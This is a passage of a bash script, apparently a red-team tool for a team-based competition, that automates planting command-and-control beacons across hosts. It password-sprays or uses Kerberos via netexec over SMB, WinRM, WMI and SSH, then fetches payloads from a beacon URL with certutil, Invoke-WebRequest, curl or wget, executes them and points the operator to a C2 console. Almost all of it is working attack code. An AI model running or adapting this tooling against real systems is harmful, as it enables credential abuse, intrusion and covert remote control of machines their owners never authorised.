        for dest in "${all_dests[@]}"; do
          if transfer_winrm "$ip" "$authed_user" "$dest"; then
            echo "    [+] Transferred via WinRM upload → $REMOTE_PATH"
            LAST_XFER="winrm"; transferred=1; break
          fi
        done ;;
      certutil)
        [[ -z "$BEACON_URL" ]] && continue
        for dest in "${all_dests[@]}"; do
          for proto in smb winrm wmi; do
            if transfer_url_certutil "$ip" "$authed_user" "$dest" "$proto"; then
              echo "    [+] Transferred via certutil ($proto) → $REMOTE_PATH"
              LAST_XFER="certutil"; transferred=1; break 2
            fi
          done
        done ;;
      iwr)
        [[ -z "$BEACON_URL" ]] && continue
        for dest in "${all_dests[@]}"; do
          for proto in smb winrm wmi; do
            if transfer_url_iwr "$ip" "$authed_user" "$dest" "$proto"; then
              echo "    [+] Transferred via IWR ($proto) → $REMOTE_PATH"
              LAST_XFER="iwr"; transferred=1; break 2
            fi
          done
        done ;;
      scp)
        [[ -z "$BEACON_FILE" ]] && continue
        local scp_dest
        if [[ $is_windows -eq 1 ]]; then
          scp_dest="C:/Windows/Temp/${BEACON_NAME}"
        else
          scp_dest="/tmp/${BEACON_NAME}"
        fi
        dbg "scp: uploading to ${authed_user}@${ip}:${scp_dest}"
        sshpass -p "$PASS" scp -o StrictHostKeyChecking=no \
          "$BEACON_FILE" "${authed_user}@${ip}:${scp_dest}" 2>/dev/null && {
          if [[ $is_windows -eq 1 ]]; then
            REMOTE_PATH="C:\\Windows\\Temp\\${BEACON_NAME}"
          else
            REMOTE_PATH="/tmp/${BEACON_NAME}"
          fi
          echo "    [+] Transferred via SCP → $REMOTE_PATH"
          LAST_XFER="scp"; transferred=1
        } ;;
      url_ssh)
        [[ -z "$BEACON_URL" ]] && continue
        local dl_cmd ssh_drop
        if [[ $is_windows -eq 1 ]]; then
          ssh_drop="C:\\Windows\\Temp\\${BEACON_NAME}"
          # Windows: try curl.exe (built-in on Win10+), then certutil, then PowerShell IWR
          dl_cmd="curl.exe -sSLo \"${ssh_drop}\" '${BEACON_URL}' 2>nul || certutil -urlcache -split -f '${BEACON_URL}' \"${ssh_drop}\" >nul 2>nul || powershell -NoP -c \"IWR -Uri '${BEACON_URL}' -OutFile '${ssh_drop}'\" 2>nul"
        else
          ssh_drop="/tmp/${BEACON_NAME}"
          dl_cmd="curl -sSLo '${ssh_drop}' '${BEACON_URL}' 2>/dev/null || wget -qO '${ssh_drop}' '${BEACON_URL}' 2>/dev/null"
        fi
        dbg "url_ssh: dl_cmd=$dl_cmd"
        local out
        out=$(netexec ssh "$ip" -u "$authed_user" -p "$PASS" -x "$dl_cmd" 2>&1)
        if echo "$out" | grep -qi '\[+\]'; then
          REMOTE_PATH="$ssh_drop"
          echo "    [+] Transferred via URL download (SSH) → $REMOTE_PATH"
          LAST_XFER="url_ssh"; transferred=1
        else
          dbg_output "url_ssh" 1 "$out"
        fi ;;
    esac
  done

  if [[ $transferred -eq 0 ]]; then
    echo "    [-] All transfer methods failed for ${BEACON_NAME}"
    dbg "transfer phase took $(timer_diff "$t0_xfer" "$(timer_now)") total"
    return 1
  fi

  # ---- EXECUTE ----
  dbg "transfer done in $(timer_diff "$t0_xfer" "$(timer_now)") — starting exec phase"
  local t0_exec; t0_exec=$(timer_now)
  if exec_beacon "$ip" "$authed_user" "$REMOTE_PATH" "$is_windows"; then
    echo "    [+] LAUNCHED ${BEACON_NAME} on ${hostname}  (total: $(timer_diff "$t0_xfer" "$(timer_now)"))"
    return 0
  else
    echo "    [-] Transfer OK but execution failed for ${BEACON_NAME} on ${hostname}  (exec took $(timer_diff "$t0_exec" "$(timer_now)"))"
    return 1
  fi
}

# ====================== PLANT ALL BINARIES ON ONE HOST ======================
plant_on_host() {
  local hostname="$1"
  local t0_host; t0_host=$(timer_now)
  local ip
  if [[ $USE_INTERNAL -eq 1 ]]; then
    ip="${HOST_INTERNAL[$hostname]}"
  else
    ip="192.168.20${TEAM}.${HOST_OCTET[$hostname]}"
  fi
  local fqdn="${hostname}.${DOMAIN}"

  echo "  [*] ${hostname} (${ip}) — ${#BEACON_FILES[@]} binary(ies)"

  # ---- Quick port scan (verbose: show results, normal: just cache) ----
  local open_ports=""
  for p in 22 135 445 5985; do
    if port_open "$ip" "$p"; then open_ports+="$p "; fi
  done
  if [[ $VERBOSE -eq 1 ]]; then
    echo "    [DBG] Open ports: ${open_ports:-none}"
  fi
  if [[ -z "$open_ports" ]]; then
    echo "    [-] No ports open — host unreachable"
    return 1
  fi

  # Detect OS: if SMB/WinRM/WMI ports open, assume Windows
  local is_windows=0
  [[ "$open_ports" == *445* || "$open_ports" == *5985* || "$open_ports" == *135* ]] && is_windows=1
  dbg "os detection: is_windows=$is_windows (ports: ${open_ports})"

  # Save auth state so kerberos fallback on one host doesn't affect others
  local save_kerberos=$USE_KERBEROS
  local save_auth_flag="$AUTH_FLAG"
  local save_pass="$PASS"

  # Determine authed user — try each until one works
  local authed_user="" authed_proto=""
  local t0_auth; t0_auth=$(timer_now)

  for user in "${ALL_USERS[@]}"; do
    dbg "auth: trying user=$user"
    for proto in smb winrm wmi; do
      local port
      case "$proto" in
        smb)   port=445 ;;
        winrm) port=5985 ;;
        wmi)   port=135 ;;
      esac
      port_open "$ip" "$port" || continue

      dbg "auth: nxc $proto $ip -u $user $([ $USE_KERBEROS -eq 1 ] && echo '-k' || echo "$AUTH_FLAG")"
      local out
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -k 2>&1)
      else
        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" 2>&1)
      fi

      if echo "$out" | grep -qi '\[+\]'; then
        authed_user="$user"
        authed_proto="$proto"
        break 2
      fi
      dbg_output "auth($user/$proto)" 1 "$out"
    done

    # Try SSH
    if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" || $SPRAY_MODE -eq 1 ]]; then
      dbg "auth: nxc ssh $ip -u $user"
      local out
      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" 2>&1)
      if echo "$out" | grep -qi '\[+\]'; then
        authed_user="$user"
        authed_proto="ssh"
        break
      fi
      dbg_output "auth($user/ssh)" 1 "$out"
    fi
  done

  # ---- Kerberos fallback: if ticket auth failed, try password spray ----
  if [[ -z "$authed_user" && $USE_KERBEROS -eq 1 ]]; then
    echo "    [!] Kerberos ticket failed — falling back to password spray"
    dbg "kerberos auth took $(timer_diff "$t0_auth" "$(timer_now)") before fallback"
    for user in "${SPRAY_USERS[@]}"; do
      dbg "fallback: trying user=$user"
      for proto in smb winrm wmi; do
        local port
        case "$proto" in
          smb)   port=445 ;;
          winrm) port=5985 ;;
          wmi)   port=135 ;;
        esac
        port_open "$ip" "$port" || continue

        local out
        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -p "$FALLBACK_PASS" 2>&1)

        if echo "$out" | grep -qi '\[+\]'; then
          authed_user="$user"
          authed_proto="$proto"
          AUTH_FLAG="-p"
          PASS="$FALLBACK_PASS"
          USE_KERBEROS=0
          break 2
        fi
      done

      if port_open "$ip" 22; then
        local out
        out=$(netexec ssh "$ip" -u "$user" -p "$FALLBACK_PASS" 2>&1)
        if echo "$out" | grep -qi '\[+\]'; then
          authed_user="$user"
          authed_proto="ssh"
          AUTH_FLAG="-p"
          PASS="$FALLBACK_PASS"
          USE_KERBEROS=0
          break
        fi
      fi
    done
  fi

  if [[ -z "$authed_user" ]]; then
    echo "    [-] No valid creds found — skipping  (auth took $(timer_diff "$t0_auth" "$(timer_now)"))"
    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
    return 1
  fi
  echo "    [+] Auth: ${authed_user} via ${authed_proto}  ($(timer_diff "$t0_auth" "$(timer_now)"))"

  # ---- Plant each binary ----
  local planted_count=0
  for bin_file in "${BEACON_FILES[@]}"; do
    BEACON_FILE="$bin_file"
    BEACON_NAME="$(basename "$bin_file")"
    if transfer_exec_one "$ip" "$authed_user" "$hostname" "$authed_proto" "$is_windows"; then
      ((planted_count++))
    fi
  done

  # Restore auth state
  USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"

  echo "    [–] ${hostname} total: $(timer_diff "$t0_host" "$(timer_now)")  (${planted_count}/${#BEACON_FILES[@]} planted)"
  [[ $planted_count -gt 0 ]] && return 0 || return 1
}

# ====================== MAIN ======================
t0_total=$(timer_now)
echo "[*] Planting on team ${TEAM}..."
[[ $VERBOSE -eq 1 ]] && echo "[*] VERBOSE MODE — debug output enabled"
echo ""

if [[ ${#TARGETS[@]} -eq 1 ]]; then
  # Single target — run directly (no parallel overhead)
  PLANTED=0 FAILED=0
  if plant_on_host "${TARGETS[0]}"; then ((PLANTED++)); else ((FAILED++)); fi
  echo ""
else
  # Multiple targets — run in parallel with live output
  TMPDIR=$(mktemp -d)
  trap 'rm -rf "$TMPDIR"' EXIT
  LOCKFILE="${TMPDIR}/.output.lock"
  touch "$LOCKFILE"
  pids=()

  for host in "${TARGETS[@]}"; do
    (
      trap - EXIT  # don't inherit parent's cleanup trap
      # Capture output, then flush it atomically under lock
      _out=$(plant_on_host "$host" 2>&1)
      _rc=$?
      echo $_rc > "${TMPDIR}/${host}.rc"
      # Atomic print: lock → flush entire host block → unlock
      (
        flock 9
        echo "$_out"
        echo ""
      ) 9>"$LOCKFILE"
    ) &
    pids+=($!)
  done

  echo "[*] ${#TARGETS[@]} hosts running in parallel — results stream as they finish..."
  echo ""
  for pid in "${pids[@]}"; do wait "$pid" 2>/dev/null; done

  # Tally results
  PLANTED=0 FAILED=0
  for host in "${TARGETS[@]}"; do
    rc=$(cat "${TMPDIR}/${host}.rc" 2>/dev/null || echo 1)
    if [[ $rc -eq 0 ]]; then ((PLANTED++)); else ((FAILED++)); fi
  done
fi

echo "=========================================="
echo "[*] Results: ${PLANTED} host(s) planted, ${FAILED} failed out of ${#TARGETS[@]} targets  ($(timer_diff "$t0_total" "$(timer_now)"))"
if [[ $PLANTED -gt 0 ]]; then
  echo "[+] Check your C2 console for new callbacks."
fi